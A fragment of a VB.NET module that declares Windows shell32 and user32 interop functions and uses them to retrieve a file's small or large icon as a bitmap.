        Public hIcon As IntPtr
        Public iIcon As Int32
        Public dwAttributes As Int32
        <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=MAX_PATH)>
        Public szDisplayName As String
        <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=80)>
        Public szTypeName As String
    End Structure
     Public Enum IconSize
        SHGFI_LARGEICON = 0
        SHGFI_SMALLICON = 1
    End Enum
    <DllImport("shell32.dll", CharSet:=CharSet.Auto)>
    Private Function SHGetFileInfo(
                ByVal pszPath As String,
                ByVal dwFileAttributes As Int32,
                ByRef psfi As SHFILEINFO,
                ByVal cbFileInfo As Int32,
                ByVal uFlags As Int32) As IntPtr
    End Function
     <DllImport("user32.dll", SetLastError:=True)>
    Private Function DestroyIcon(ByVal hIcon As IntPtr) As Boolean
    End Function
    Public Function GetFileIcon(ByVal fileExt As String) As Bitmap
        Dim ICOsize As Integer = IconSize.SHGFI_SMALLICON
        If SpySettings.FM_IC_Size = "Large" Then
            ICOsize = IconSize.SHGFI_LARGEICON
        Else
            ICOsize = IconSize.SHGFI_SMALLICON
        End If
        Dim shinfo As New SHFILEINFO
        shinfo.szDisplayName = New String(Chr(0), MAX_PATH)
        shinfo.szTypeName = New String(Chr(0), 80)
        SHGetFileInfo(fileExt, FILE_ATTRIBUTE_NORMAL, shinfo, Marshal.SizeOf(shinfo), SHGFI_ICON Or ICOsize Or SHGFI_USEFILEATTRIBUTES)
        Dim bmp As Bitmap = System.Drawing.Icon.FromHandle(shinfo.hIcon).ToBitmap
        DestroyIcon(shinfo.hIcon)
        Return bmp
    End Function
     Private Const SHGFI_LARGEICON As Integer = &H0
    Private Const SHGFI_SMALLICON As Integer = &H1
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.[Unicode])>
    Public Structure SHFILEINFOW
        Public hIcon As IntPtr
        Public iIcon As Integer
        Public dwAttributes As Integer
        <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=260)> Public szDisplayName As String
        <MarshalAs(UnmanagedType.ByValTStr, SizeConst:=80)> Public szTypeName As String
    End Structure
     <DllImport("shell32.dll", EntryPoint:="SHGetFileInfoW")>
    Private Function SHGetFileInfoW(<InAttribute(), MarshalAs(UnmanagedType.LPTStr)> ByVal pszPath As String, ByVal dwFileAttributes As Integer, ByRef psfi As SHFILEINFOW, ByVal cbFileInfo As Integer, ByVal uFlags As Integer) As Integer
    End Function
    Public Function GetIcon(ByVal PathName As String, ByVal LargeIco As Boolean) As Bitmap
        Dim fi As New SHFILEINFOW
        If LargeIco Then
            SHGetFileInfoW(PathName, 0, fi, Marshal.SizeOf(fi), SHGFI_ICON Or SHGFI_LARGEICON)
        Else
            SHGetFileInfoW(PathName, 0, fi, Marshal.SizeOf(fi), SHGFI_ICON Or SHGFI_SMALLICON)
        End If
        Dim bm As Bitmap = Icon.FromHandle(fi.hIcon).ToBitmap
        DestroyIcon(fi.hIcon)
        Return bm
    End Function
End Module
 